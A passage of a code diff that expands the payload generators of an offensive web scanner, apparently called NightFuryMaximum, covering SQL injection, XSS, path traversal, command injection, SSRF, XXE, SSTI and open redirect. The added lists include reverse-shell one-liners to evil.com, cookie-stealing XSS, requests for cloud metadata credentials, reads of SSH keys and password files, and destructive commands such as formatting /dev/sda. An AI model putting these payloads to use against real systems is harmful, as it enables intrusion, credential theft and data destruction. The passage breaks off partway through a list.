@@ -15,6 +15,7 @@ import urllib3
 import requests
 import threading
 import subprocess
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime
 from urllib.parse import urlparse, parse_qs, urljoin, quote, unquote
 from collections import defaultdict
@@ -78,72 +79,457 @@ class NightFuryMaximum:
     # ==================== CORE FUNCTIONS ====================
     
     def _get_deep_payloads(self, category):
-        """Dinamis Generator: Menghasilkan 500+ payload unik per kategori (Internal Only)"""
         payloads = set()
         
         if category == 'sqli_error':
-            bases = ["'", "\"", "')", "\"))", "1'", "1\"", " admin'", " admin\""]
-            ops = ["OR", "AND", "UNION SELECT", "WHERE"]
-            conditions = ["1=1", "'a'='a'", "7=7", "sleep(0)", "benchmark(1,1)", "CAST(0x41 AS SIGNED)"]
-            comments = ["--", "#", "/* */", "-- -", ";%00", "`", "||", "&&"]
-            whitespaces = [" ", "/**/", "%09", "%0a", "%0b", "+"]
+            bases = ["'", "\"", "')", "\"))", "1'", "1\"", "admin'", "test'", "user'", "''", "\"\"", "') ", "\")) ", "1' ", "' OR ", "\" OR ", "') OR ", "' AND ", "\" AND ", "') AND "]
+            ops = ["OR", "AND", "OR", "OR", "AND", "UNION ALL SELECT", "UNION SELECT", "UNION", "WHERE", "HAVING"]
+            conditions = ["1=1", "'1'='1'", "\"1\"=\"1\"", "1=2", "'a'='a'", "7=7", "1=1", "2=2", "99=99", "'x'='x'", "NULL IS NULL", "NOT NULL", "1<>2", "2>1"]
+            comments = ["--", "-- ", "#", "/*", ";%00", "-- -", "--+", "/*!", "*/", " %00"]
+            whitespaces = [" ", "/**/", "%09", "%0a", "%0b", "%0c", "%0d", "+", "%20", "\t"]
+            functions = ["CONCAT(0x41,0x42)", "VERSION()", "DATABASE()", "USER()", "@@version", "CURRENT_USER()", "NOW()", "RAND()", "UUID()", "BENCHMARK(1,1)", "SLEEP(0)", "MD5(1)", "PASSWORD('1')", "LOAD_FILE(0x2f6574632f706173737764)"]
             
-            while len(payloads) < 550:
-                b, o, c, cm, w = random.choice(bases), random.choice(ops), random.choice(conditions), random.choice(comments), random.choice(whitespaces)
-                if "UNION" in o:
-                    cols = ",".join(["NULL"] * random.randint(1, 15))
-                    p = f"{b}{w}{o}{w}{cols}{w}{cm}"
-                else:
+            while len(payloads) < 200:
+                b = random.choice(bases)
+                o = random.choice(ops)
+                c = random.choice(conditions)
+                cm = random.choice(comments)
+                w = random.choice(whitespaces)
+                f = random.choice(functions)
+                
+                r = random.random()
+                if r < 0.15:
                     p = f"{b}{w}{o}{w}{c}{w}{cm}"
+                elif r < 0.25:
+                    p = f"{b}{w}{o}{w}{f}{w}{cm}"
+                elif r < 0.35:
+                    p = f"{b}{w}{o}{w}{c}{w}{o}{w}{c}{w}{cm}"
+                elif r < 0.50 and "UNION" in o:
+                    cols_count = random.randint(1, 25)
+                    cols = ",".join([f"{f}" if random.random() > 0.5 else "NULL" for _ in range(cols_count)])
+                    p = f"{b}{w}{o}{w}{cols}{w}{cm}"
+                elif r < 0.65:
+                    p = f"{b}{w}{o}{w}{c}{w}/*{w}{c}{w}*/{w}{cm}"
+                elif r < 0.80:
+                    p = f"{b}{w}{o}{w}EXISTS({w}SELECT{w}{c}){w}{cm}"
+                else:
+                    p = f"{b}{w}{o}{w}{c}{w}{o}{w}{f}{w}{cm}"
                 payloads.add(p)
                 
-        elif category == 'xss':
-            tags = ["script", "img", "svg", "body", "iframe", "input", "details", "video", "audio", "marquee", "isindex", "keygen"]
-            events = ["onload", "onerror", "onfocus", "onmouseover", "ontoggle", "onstart", "onclick", "onscroll"]
-            actions = ["alert(1)", "confirm(1)", "prompt(1)", "fetch('//evil.com')", "eval(atob('YWxlcnQoMSk='))"]
-            encodings = ["", "javascript:", "vbscript:"]
+        elif category == 'sqli_time':
+            db_sleep = [
+                "' OR SLEEP(5)--", "' OR SLEEP(3)--", "' OR SLEEP(7)--",
+                "1' AND SLEEP(5)--", "1' AND SLEEP(3)--", "1' AND SLEEP(7)--",
+                "'; WAITFOR DELAY '00:00:05'--", "1'; WAITFOR DELAY '00:00:05'--",
+                "'; WAITFOR DELAY '00:00:03'--", "1'; WAITFOR DELAY '00:00:07'--",
+                "' OR pg_sleep(5)--", "1' AND pg_sleep(5)--", "' OR pg_sleep(3)--",
+                "' OR BENCHMARK(5000000,MD5(1))--", "1' AND BENCHMARK(5000000,MD5(1))--",
+                "' OR BENCHMARK(10000000,SHA1(1))--", "' OR BENCHMARK(25000000,AES_ENCRYPT(1,1))--",
+                "1' AND BENCHMARK(5000000,SHA2(1,256))--",
+                "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+                "' OR (SELECT * FROM (SELECT(SLEEP(3)))a)--",
+                "1' OR (SELECT * FROM (SELECT(SLEEP(5)))b)--",
+                "'; EXEC xp_cmdshell 'ping 127.0.0.1 -n 5'--",
+                "' OR IF(1=1,SLEEP(5),0)--", "1' AND IF(1=1,SLEEP(5),0)--",
+                "' OR IF(1=1,pg_sleep(5),0)--", "1' AND IF(1=1,pg_sleep(5),0)--",
+                "'; SELECT SLEEP(5);--", "\" OR SLEEP(5)--", "\" AND SLEEP(5)--",
+                "') OR SLEEP(5)--", "') AND SLEEP(5)--",
+                "'; SLEEP(5);--", "1'; SLEEP(5);--",
+                "' OR dbms_lock.sleep(5)--", "1' AND dbms_lock.sleep(5)--",
+                "'; dbms_lock.sleep(5);--", "1'; dbms_lock.sleep(5);--",
+                "'; EXECUTE IMMEDIATE 'SELECT BENCHMARK(10000000,MD5(1))'--",
+                "' OR (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B)--",
+                "1' OR (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B)--",
+                "') OR SLEEP(5)#", "') AND SLEEP(5)#",
+                "') WAITFOR DELAY '00:00:05'--", "') WAITFOR DELAY '00:00:05'#",
+                "')) OR SLEEP(5)--", "')) AND SLEEP(5)--",
+                "1')); WAITFOR DELAY '00:00:05'--", "')); WAITFOR DELAY '00:00:05'--",
+                "1' OR SLEEP(5) AND '1'='1", "1' OR SLEEP(5) AND '1'='2",
+                "1' OR pg_sleep(5) AND '1'='1", "' UNION SELECT SLEEP(5)--",
+                "' UNION SELECT NULL,SLEEP(5)--", "' UNION SELECT NULL,NULL,SLEEP(5)--",
+                "admin' OR SLEEP(5)--", "admin' WAITFOR DELAY '00:00:05'--",
+                "' OR pg_sleep(5)-- -", "' OR pg_sleep(5)#",
+                "1' OR pg_sleep(5)-- -", "1' OR pg_sleep(5)#",
+            ]
+            db_test = [
+                "' OR SLEEP(5)--", "' OR SLEEP(3)--", "' OR SLEEP(7)--",
+                "1' AND SLEEP(5)--", "1' AND SLEEP(3)--",
+                "'; WAITFOR DELAY '00:00:05'--", "1'; WAITFOR DELAY '00:00:05'--",
+                "' OR pg_sleep(5)--", "1' AND pg_sleep(5)--",
+                "' OR BENCHMARK(5000000,MD5(1))--", "1' AND BENCHMARK(5000000,MD5(1))--",
+                "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+                "1' OR (SELECT * FROM (SELECT(SLEEP(5)))b)--",
+                "' OR IF(1=1,SLEEP(5),0)--", "1' AND IF(1=1,SLEEP(5),0)--",
+                "\" OR SLEEP(5)--", "') OR SLEEP(5)--",
+                "' OR dbms_lock.sleep(5)--", "1' AND dbms_lock.sleep(5)--",
+                "') OR SLEEP(5)#", "')) OR SLEEP(5)--",
+                "1' OR pg_sleep(5)-- -", "' UNION SELECT SLEEP(5)--",
+            ]
+            for p in db_sleep:
+                payloads.add((p, 4))
+            for p in db_test:
+                payloads.add((p, 4))
+            while len(payloads) < 50:
+                p = random.choice(db_sleep)
+                payloads.add((p[0] if isinstance(p, tuple) else p, 4))
             
-            while len(payloads) < 550:
-                t, e, a, enc = random.choice(tags), random.choice(events), random.choice(actions), random.choice(encodings)
+        elif category == 'sqli_boolean':
+            true_payloads = [
+                "' AND '1'='1", "' AND 1=1", "' AND 'a'='a", "' AND 7=7",
+                "\" AND \"1\"=\"1", "\" AND 1=1", "1 AND 1=1", "' OR '1'='1'--",
+                "' OR 1=1--", "' OR 'a'='a'--", "') AND '1'='1", "') AND 1=1",
+                "\") AND \"1\"=\"1", "') OR '1'='1'--", "') OR 1=1--",
+                "' AND '1'='1'--", "\" AND \"1\"=\"1\"--", "1' AND '1'='1",
+                "1' AND 1=1", "1\" AND \"1\"=\"1", "1 AND 1=1--",
+                "' OR '1'='1'#", "' OR 1=1#", "' OR 'a'='a'#",
+                "1' AND '1'='1'--", "1' AND 1=1--", "' AND 1=1#",
+                "' AND '1'='1'/*", "' OR '1'='1'/*", "1' OR 1=1/*",
+                "' AND SLEEP(0)--", "1' AND BENCHMARK(1,1)--",
+                "' OR 1=1 LIMIT 1--", "' OR 1=1 GROUP BY 1--",
+                "') OR ('1'='1", "') OR (1=1)", "')) OR (('1'='1",
+                "1' OR '1'='1", "1' OR 1=1", "1' OR '1'='1'--",
+                "\"' OR '1'='1", "1\" OR \"1\"=\"1", "admin' OR '1'='1'--",
+                "test' OR '1'='1'--", "user' OR '1'='1'--",
+            ]
+            false_payloads = [
+                "' AND '1'='2", "' AND 1=2", "' AND 'a'='b", "' AND 8=9",
+                "\" AND \"1\"=\"2", "\" AND 1=2", "1 AND 1=2", "' OR '1'='2'--",
+                "' OR 1=2--", "' OR 'a'='b'--", "') AND '1'='2", "') AND 1=2",
+                "\") AND \"1\"=\"2", "') OR '1'='2'--", "') OR 1=2--",
+                "' AND '1'='2'--", "\" AND \"1\"=\"2\"--", "1' AND '1'='2",
+                "1' AND 1=2", "1\" AND \"1\"=\"2", "1 AND 1=2--",
+                "' OR '1'='2'#", "' OR 1=2#", "' OR 'a'='b'#",
+                "1' AND '1'='2'--", "1' AND 1=2--", "' AND 1=2#",
+                "' AND '1'='2'/*", "' OR '1'='2'/*", "1' OR 1=2/*",
+                "' OR 1=2 LIMIT 1--", "' OR 1=2 GROUP BY 1--",
+                "') OR ('1'='2", "') OR (1=2)", "')) OR (('1'='2",
+                "1' OR '1'='2", "1' OR 1=2", "1' OR '1'='2'--",
+                "\"' OR '1'='2", "1\" OR \"1\"=\"2", "admin' OR '1'='2'--",
+                "test' OR '1'='2'--", "user' OR '1'='2'--",
+            ]
+            while len(payloads) < 200:
+                i = random.randint(0, len(true_payloads)-1)
+                payloads.add((true_payloads[i], false_payloads[i % len(false_payloads)]))
+                
+        elif category == 'sqli_union':
+            bases = ["'", "\"", "')", "\"))", "1'", "1\"", "admin'", "''", "\"\"", "') "]
+            for b in bases:
+                for col_count in range(1, 26):
+                    cols = ",".join(["NULL"] * col_count)
+                    payloads.add(f"{b} UNION SELECT {cols}--")
+                    payloads.add(f"{b} UNION ALL SELECT {cols}--")
+                    payloads.add(f"{b} UNION SELECT {cols}#")
+                    payloads.add(f"{b} UNION ALL SELECT {cols}#")
+                    payloads.add(f"{b} UNION SELECT {cols}/*")
+                    payloads.add(f"{b} UNION ALL SELECT {cols}/*")
+                    if col_count >= 2:
+                        vals = ",".join([f"{random.choice(['1','2','3','4','5','6','7','8','9'])}" for _ in range(col_count)])
+                        payloads.add(f"{b} UNION SELECT {vals}--")
+                        payloads.add(f"{b} UNION SELECT {vals}#")
+            for b in bases:
+                for col_count in range(2, 12):
+                    rand_cols = ",".join([f"NULL"] * col_count)
+                    payloads.add(f"{b} UNION SELECT {rand_cols} FROM information_schema.tables--")
+                    payloads.add(f"{b} UNION SELECT {rand_cols} FROM mysql.user--")
+                    payloads.add(f"{b} UNION SELECT {rand_cols} FROM pg_catalog.pg_tables--")
+                    payloads.add(f"{b} UNION SELECT {rand_cols} FROM all_tables--")
+            while len(payloads) < 200:
+                b = random.choice(bases)
+                col_count = random.randint(1, 30)
+                cols = ",".join(["NULL"] * col_count)
+                payloads.add(f"{b} UNION SELECT {cols}--")
+                
+        elif category == 'xss':
+            tags = ["script", "img", "svg", "body", "iframe", "input", "details", "video", "audio", "marquee", "isindex", "keygen", "object", "embed", "style", "link", "table", "div", "span", "a", "p", "br", "hr", "meta", "base", "form", "button", "select", "textarea", "title", "frameset", "frame", "layer", "ilayer", "bgsound", "meta", "isindex", "listing", "xmp", "noscript"]
+            events = ["onload", "onerror", "onfocus", "onmouseover", "ontoggle", "onstart", "onclick", "onscroll", "onblur", "onchange", "onsubmit", "onreset", "onselect", "onabort", "onkeydown", "onkeypress", "onkeyup", "onmouseout", "onmouseenter", "onmouseleave", "ondblclick", "onresize", "onpageshow", "onunload", "onbeforeunload", "onstorage", "onpopstate", "onhashchange", "ononline", "onoffline", "onwaiting", "onplay", "onpause", "oncanplay", "onprogress", "onsuspend", "onemptied", "onstalled", "onseeking", "onseeked", "ontimeupdate", "ondurationchange", "onratechange", "onvolumechange", "oncuechange", "ontoggle"]
+            js_actions = ["alert(1)", "confirm(1)", "prompt(1)", "fetch('//evil.com')", "eval(atob('YWxlcnQoMSk='))", "alert(document.domain)", "confirm(document.cookie)", "prompt(document.URL)", "eval('alert(1)')", "console.log(1)", "throw new Error(1)", "open('//evil.com')", "location='//evil.com'", "document.location='//evil.com'", "window.name='xss'", "new Image().src='//evil.com/'+document.cookie", "XMLHttpRequest`open``send`", "setTimeout('alert(1)')", "setInterval('alert(1)')", "String.fromCharCode(97,108,101,114,116,40,49,41)", "atob('YWxlcnQoMSk=')", "eval.call(null,'alert(1)')", "Function('alert(1)')()", "constructor.constructor('alert(1)')()"]
+            encodings = ["", "javascript:", "vbscript:", "JAVASCRIPT:", "VBSCRIPT:", "JavaScripT:", "java%0ascript:", "java\tascript:", "java\nscript:"]
+            prefixes = ["", "';", "\";", "';alert(1);';", "\";alert(1);\";", "<!--", "--!>", "<![CDATA[", "]]>"]
+            suffixes = ["", "//", "<!--", "-->", "'';alert(1);''", "\"\";alert(1);\"\""]
+            
+            while len(payloads) < 200:
+                t = random.choice(tags)
+                e = random.choice(events)
+                a = random.choice(js_actions)
+                enc = random.choice(encodings)
+                pref = random.choice(prefixes)
+                suff = random.choice(suffixes)
+                
+                r = random.random()
                 if t == "script":
-                    p = f"<{t}>{a}</{t}>"
-                elif t in ["img", "video", "audio"]:
-                    p = f"<{t} src=x {e}={a}>"
+                    if r < 0.3:
+                        p = f"<{t}>{a}</{t}>"
+                    elif r < 0.5:
+                        p = f"<{t} defer>{a}</{t}>"
+                    elif r < 0.7:
+                        p = f"<{t} async>{a}</{t}>"
+                    elif r < 0.85:
+                        p = f"<{t} src=data:text/javascript,{a}></{t}>"
+                    else:
+                        p = f"<{t}>{pref}{a}{suff}</{t}>"
+                elif t in ["img", "video", "audio", "input", "embed", "source", "track"]:
+                    if r < 0.3:
+                        p = f"<{t} src=x {e}={a}>"
+                    elif r < 0.5:
+                        p = f"<{t} src=x {e}=eval(atob('YWxlcnQoMSk='))>"
+                    elif r < 0.7:
+                        p = f"<{t} src=\"\" {e}={a}>"
+                    else:
+                        p = f"<{t} src=1 {e}={a} x=>"
+                elif t == "details":
+                    p = f"<{t} open {e}={a}>"
+                elif t == "marquee":
+                    p = f"<{t} {e}={a}>"
+                elif t in ["body", "frameset", "style"]:
+                    p = f"<{t} {e}={a}>"
                 elif t == "a":
-                    p = f"<a href={enc}{a}>click</a>"
+                    if r < 0.3:
+                        p = f"<a href={enc}{a}>click</a>"
+                    elif r < 0.5:
+                        p = f"<a href=\"{enc}{a}\">click</a>"
+                    else:
+                        p = f"<a href='{enc}{a}'>click</a>"
+                elif t in ["table", "td", "tr"]:
+                    p = f"<table background=\"{enc}{a}\">"
+                elif t in ["div", "span", "p"]:
+                    p = f"<div style=\"background-image:url({enc}{a})\">"
+                elif t == "form":
+                    p = f"<form><button formaction={enc}{a}>X</button></form>"
+                elif t == "object":
+                    p = f"<object data=\"{enc}{a}\">"
+                elif t in ["keygen", "isindex"]:
+                    p = f"<{t} {e}={a}>"
+                elif t == "meta":
+                    p = f"<meta http-equiv=\"refresh\" content=\"0;url={enc}{a}\">"
                 else:
                     p = f"<{t} {e}={a}>"
                 
-                # Variasi bypass
-                if random.random() > 0.5:
-                    p = p.replace(" ", "/**/").replace("<", "&lt;").replace(">", "&gt;") if random.random() > 0.8 else p
+                if random.random() > 0.6:
+                    p = p.replace(" ", "/**/")
+                if random.random() > 0.85:
+                    p = p.upper() if random.random() > 0.5 else p.lower()
+                if random.random() > 0.9:
+                    p = f"\"'><{p}"
                 payloads.add(p)
 
         elif category == 'lfi':
-            traversals = ["../", "..\\", "..;/", "....//", "%2e%2e%2f", "%252e%252e%252f"]
-            files = ["etc/passwd", "windows/win.ini", "etc/shadow", "etc/hosts", "proc/self/environ", "var/log/auth.log"]
-            suffixes = ["", "%00", ".jpg", "\0", ".php"]
+            traversals = ["../", "..\\", "..;/", "....//", "....\\\\", "%2e%2e%2f", "%252e%252e%252f", "..%252f", "..%c0%af", "..%ef%bc%8f", "..%e0%80%af", "..%c1%9c"]
+            prefixes = ["", "/", "file://", "php://filter/convert.base64-encode/resource=", "php://filter/string.rot13/resource=", "php://filter/zlib.deflate/resource="]
+            linux_files = ["etc/passwd", "etc/shadow", "etc/hosts", "etc/group", "etc/issue", "etc/motd", "etc/bashrc", "etc/profile", "etc/crontab", "etc/fstab", "etc/resolv.conf", "etc/sudoers", "etc/ssh/sshd_config", "etc/mysql/my.cnf", "etc/php.ini", "etc/nginx/nginx.conf", "etc/apache2/apache2.conf", "etc/httpd/conf/httpd.conf", "proc/self/environ", "proc/self/status", "proc/self/cmdline", "proc/self/mounts", "proc/self/fd/0", "proc/self/fd/1", "proc/self/fd/2", "proc/version", "proc/cpuinfo", "proc/meminfo", "proc/net/tcp", "var/log/apache2/access.log", "var/log/apache2/error.log", "var/log/httpd/access_log", "var/log/httpd/error_log", "var/log/nginx/access.log", "var/log/nginx/error.log", "var/log/auth.log", "var/log/syslog", "var/log/messages", "var/log/dpkg.log", "var/log/kern.log", "var/log/mysql/error.log", "var/www/html/index.php", "var/www/html/config.php", "home/www/html/wp-config.php", "home/ubuntu/.ssh/id_rsa", "root/.bashrc", "root/.ssh/id_rsa", "opt/lampp/etc/passwd", "usr/local/etc/php.ini"]
+            windows_files = ["windows/win.ini", "windows/system.ini", "windows/system32/drivers/etc/hosts", "windows/system32/config/sam", "windows/repair/sam", "windows/repair/system", "windows/regedit.exe", "boot.ini", "autoexec.bat", "windows/php.ini", "windows/system32/license.rtf", "Program Files/Apache Group/Apache/conf/httpd.conf", "Program Files/MySQL/MySQL Server 5.5/my.ini", "Program Files/FileZilla Server/FileZilla Server.xml"]
+            suffixes = ["", "%00", ".jpg", "\0", ".php", ".html", ".txt", ".php%00", ".jpg%00", ".php\x00", "%2500", "?", "%3f", ".%00", "/%00"]
             
-            while len(payloads) < 550:
-                t = random.choice(traversals) * random.randint(3, 15)
-                f = random.choice(files)
+            while len(payloads) < 200:
+                t = random.choice(traversals) * random.randint(2, 20)
+                f = random.choice(linux_files + windows_files)
                 s = random.choice(suffixes)
-                payloads.add(f"{t}{f}{s}")
+                p = random.choice(prefixes)
+                
+                r = random.random()
+                if r < 0.15:
+                    payloads.add(f"{p}{t}{f}{s}")
+                elif r < 0.30:
+                    payloads.add(f"{p}{t}{f}")
+                elif r < 0.45:
+                    payloads.add(f"/{t}{f}{s}")
+                elif r < 0.60:
+                    payloads.add(f"/{t}{f}")
+                elif r < 0.75:
+                    payloads.add(f"{p}{t}{f}{s}%23")
+                else:
+                    deep_t = random.choice(traversals) * random.randint(5, 25)
+                    payloads.add(f"{p}{deep_t}{f}{s}")
                 
         elif category == 'cmdi':
-            separators = [";", "|", "&", "||", "&&", "`", "$(", "\n"]
-            commands = ["echo vulnerable", "id", "whoami", "uname -a", "cat /etc/passwd", "dir", "ipconfig"]
+            separators = [";", "|", "&", "||", "&&", "`", "$(", "\n", "%0a", "; ", "| ", "& "] 
+            linux_cmds = ["echo vulnerable", "id", "whoami", "uname -a", "cat /etc/passwd", "pwd", "ls -la", "hostname", "ifconfig", "wget http://evil.com/shell", "curl http://evil.com", "nc -e /bin/sh evil.com 4444", "bash -i >& /dev/tcp/evil.com/4444 0>&1", "python -c 'import socket;s=socket.socket();s.connect((\"evil.com\",4444))'", "perl -e 'use Socket;$i=\"evil.com\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)))'", "php -r '$s=fsockopen(\"evil.com\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'", "ruby -rsocket -e 'c=TCPSocket.new(\"evil.com\",4444);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'", "cat /etc/shadow", "find / -name *.php", "ps aux", "netstat -an", "nslookup google.com", "ping -c 5 127.0.0.1", "sleep 5", "echo $(whoami)", "echo `whoami`", "expr 1 + 1", "kill -9 1", "reboot", "shutdown -r now", "chmod 777 /etc/shadow", "dd if=/dev/zero of=/dev/mem", "mkfs.ext4 /dev/sda"]
+            windows_cmds = ["dir", "type C:\\windows\\win.ini", "ipconfig", "systeminfo", "whoami", "net user", "net localgroup administrators", "tasklist", "ver", "echo vulnerable", "cmd /c dir", "powershell -c Get-Process", "powershell -c Get-Service", "powershell -c Invoke-Expression('echo vulnerable')", "cscript", "wscript", "mshta", "reg query HKLM", "netstat -an", "ping -n 5 127.0.0.1", "tracert google.com", "nslookup google.com", "timeout 5"]
+            cmdi_payloads = set()
             
-            while len(payloads) < 550:
+            for sep in separators:
+                for cmd in linux_cmds + windows_cmds:
+                    if sep in ["`", "$("]:
+                        p = f"{sep}{cmd}{'`' if sep == '`' else ')'}"
+                    elif sep == "\n":
+                        p = f"{sep}{cmd}"
+                    elif sep == "%0a":
+                        p = f"{sep}{cmd}"
+                    else:
+                        p = f"{sep} {cmd}"
+                    cmdi_payloads.add(p)
+            
+            while len(payloads) < 200:
                 s = random.choice(separators)
-                c = random.choice(commands)
+                c = random.choice(linux_cmds + windows_cmds)
+                if s in ["`", "$("]:
+                    p = f"{s}{c}{'`' if s == '`' else ')'}"
+                elif s in ["\n", "%0a"]:
+                    p = f"{s}{c}"
+                else:
+                    p = f"{s} {c}"
+                payloads.add(p)
+                
+        elif category == 'cmdi_time':
+            for sep in [";", "|", "&", "||", "&&", "`", "$("]:
+                for cmd in ["sleep 5", "ping -c 5 127.0.0.1", "timeout 5"]:
+                    if sep in ["`", "$("]:
+                        p = f"{sep}{cmd}{'`' if sep == '`' else ')'}"
+                    else:
+                        p = f"{sep} {cmd}"
+                    payloads.add((p, 4))
+            while len(payloads) < 50:
+                s = random.choice([";", "|", "&", "||", "&&", "`", "$("])
+                c = random.choice(["sleep 5", "ping -c 5 127.0.0.1", "timeout 5", "ping -n 5 127.0.0.1", "sleep 3", "sleep 7"])
                 if s in ["`", "$("]:
                     p = f"{s}{c}{'`' if s == '`' else ')'}"
                 else:
                     p = f"{s} {c}"
+                payloads.add((p, 4))
+                
+        elif category == 'ssrf':
+            internal_ips = [
+                "http://127.0.0.1:", "http://localhost:", "http://0.0.0.0:",
+                "http://[::1]:", "http://10.", "http://172.16.", "http://172.17.", "http://172.18.", "http://172.19.", "http://172.20.", "http://172.21.", "http://172.22.", "http://172.23.", "http://172.24.", "http://172.25.", "http://172.26.", "http://172.27.", "http://172.28.", "http://172.29.", "http://172.30.", "http://172.31.", "http://192.168.",
+                "http://169.254.169.254", "http://metadata.google.internal", "http://100.100.100.200",
+                "http://metadata.tencentyun.com", "http://169.254.169.250", "http://169.254.169.251",
+                "http://2130706433/", "http://0x7f000001/", "http://0177.0.0.1/",
+                "http://127.0.0.2:", "http://127.0.0.3:", "http://127.0.0.4:", "http://127.0.0.5:",
+            ]
+            ports = [22, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200, 11211, 27017, 21, 25, 53, 110, 143, 993, 135, 139, 445, 1433, 1521, 2049, 3389, 5900, 5984, 6667, 9092, 9418, 50000]
+            protocols = ["http://", "https://", "gopher://", "dict://", "ftp://", "file://", "ldap://"]
+            cloud_endpoints = [
+                "http://169.254.169.254/latest/meta-data/", "http://169.254.169.254/latest/user-data/",
+                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+                "http://169.254.169.254/latest/meta-data/public-keys/",
+                "http://169.254.169.254/latest/meta-data/placement/availability-zone/",
+                "http://metadata.google.internal/computeMetadata/v1/",
+                "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+                "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
+                "http://metadata.google.internal/computeMetadata/v1/project/project-id",
+                "http://100.100.100.200/latest/meta-data/",
+                "http://100.100.100.200/latest/user-data/",
+                "http://169.254.169.254/metadata/instance?api-version=2017-08-01",
+            ]
+            
+            for ip in internal_ips:
+                for port in random.sample(ports, 10):
+                    payloads.add(f"{ip}{port}")
+            for ep in cloud_endpoints:
+                payloads.add(ep)
+            for proto in protocols:
+                for ip in ["127.0.0.1", "localhost", "0.0.0.0"]:
+                    for port in random.sample(ports, 5):
+                        payloads.add(f"{proto}{ip}:{port}")
+            while len(payloads) < 200:
+                ip = random.choice(internal_ips)
+                port = random.choice(ports)
+                payloads.add(f"{ip}{port}")
+                
+        elif category == 'xxe':
+            dtds = [
+                ('file:///etc/passwd', 'read'),
+                ('php://filter/convert.base64-encode/resource=/etc/passwd', 'read'),
+                ('http://127.0.0.1:80/', 'http'),
+                ('http://localhost:8080/', 'http'),
+                ('ftp://localhost:21/', 'ftp'),
+                ('gopher://localhost:8080/', 'gopher'),
+                ('expect://ls', 'exec'),
+            ]
+            entities = ["test", "xxe", "data", "file", "evil", "pwn", "x1", "x2", "x3", "d1", "d2", "e1", "e2"]
+            
+            while len(payloads) < 200:
+                e = random.choice(entities)
+                uri, etype = random.choice(dtds)
+                r = random.random()
+                if r < 0.35:
+                    p = f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY {e} SYSTEM "{uri}">]><root>&{e};</root>'
+                elif r < 0.55:
+                    p = f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % {e} SYSTEM "{uri}">%{e};]><root>test</root>'
+                elif r < 0.70:
+                    p = f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY {e} SYSTEM "{uri}">]><r>&{e};</r>'
+                elif r < 0.85:
+                    p = f'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY {e} SYSTEM "{uri}">]><root><data>&{e};</data></root>'
+                else:
+                    e2 = random.choice(entities)
+                    while e2 == e:
+                        e2 = random.choice(entities)
+                    p = f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % {e} SYSTEM "{uri}"><!ENTITY {e2} "%{e};">]><root>&{e2};</root>'
                 payloads.add(p)
+                
+        elif category == 'ssti':
+            tests = [
+                ("{{7*7}}", "49"), ("${7*7}", "49"), ("{{7*'7'}}", "7777777"),
+                ("<%= 7*7 %>", "49"), ("{{config}}", "config"), ("{{self}}", "self"),
+                ("{{request}}", "request"), ("{{_self}}", "_self"),
+                ("{{7*7}}", "49"), ("${7*7}", "49"), ("{{7*'7'}}", "7777777"),
+                ("{{7^7}}", "0"), ("${7^7}", "0"), ("{{7+7}}", "14"),
+                ("{{7-7}}", "0"), ("{{7/7}}", "1"), ("{{7*7}}", "49"),
+            ]
+            for t, e in tests:
+                payloads.add((t, e))
+            jinja2 = [
+                ("{{7*7}}", "49"), ("{{7*'7'}}", "7777777"), ("{{config}}", "config"),
+                ("{{request}}", "request"), ("{{self.__class__.__mro__}}", "__mro__"),
+                ("{{''.__class__.__mro__}}", "__mro__"), ("{{()|attr('__class__')}}", "__class__"),
+                ("{{lipsum|attr('__globals__')}}", "__globals__"),
+                ("{{cycler|attr('__init__')|attr('__globals__')}}", "__globals__"),
+                ("{{joiner|attr('__init__')|attr('__globals__')}}", "__globals__"),
+                ("{{namespace|attr('__init__')|attr('__globals__')}}", "__globals__"),
+                ("{{config|attr('from_envvar')}}", "from_envvar"),
+                ("{{request|attr('application')}}", "application"),
+                ("{{request.environ}}", "environ"),
+                ("{{app=request.application}}", "application"),
+            ]
+            for t, e in jinja2:
+                payloads.add((t, e))
+            twig = [("{{7*7}}", "49"), ("{{_self.env.registerUndefinedFilterCallback('exec')}}", "registerUndefinedFilterCallback")]
+            for t, e in twig:
+                payloads.add((t, e))
+            mako = [("${7*7}", "49"), ("${self.__class__.__mro__}", "__mro__"), ("${self.module.cache.__class__}", "__class__")]
+            for t, e in mako:
+                payloads.add((t, e))
+            smarty = [("{7*7}", "49"), ("{$smarty.version}", "smarty"), ("{php}echo 49;{/php}", "49")]
+            for t, e in smarty:
+                payloads.add((t, e))
+            while len(payloads) < 200:
+                t, e = random.choice(tests)
+                payloads.add((t, e))
+                
+        elif category == 'open_redirect':
+            urls = [
+                "http://evil.com", "https://evil.com", "//evil.com",
+                "http://evil.com/", "https://evil.com/", "//evil.com/",
+                "http://evil.com:8080", "https://evil.com:8443", "//evil.com:8080",
+                "https://evil.com@google.com", "http://evil.com@google.com",
+                "https://google.com.evil.com", "http://google.com.evil.com",
+                "https://evil.com%2Fgoogle.com", "http://evil.com%2Fgoogle.com",
+                "////evil.com", "/////evil.com", "//////evil.com",
+                "https://evil.com.evil.net", "http://evil.com.evil.net",
+                "https://evil.com/google.com", "http://evil.com/google.com",
+                "https:evil.com", "http:evil.com", "javascript:alert(1)",
+                "data:text/html,<script>alert(1)</script>",
+                "vbscript:msgbox(1)", "file:///etc/passwd",
+                "ftp://evil.com", "gopher://evil.com:8080",
+                "//evil.com@google.com", "///evil.com",
+                "http://127.0.0.1:80", "http://localhost:80",
+                "https://evil.com%2F%2Fgoogle.com",
+                "https://evil.com\\@google.com",
+                "https://evil.com:443@google.com:443",
+                "http://evil\\@google.com",
+                "//evil.com@localhost",
+                "http://[::1]:80", "http://0x7f000001:80",
+                "http://2130706433:80", "http://0177.0.0.1:80",
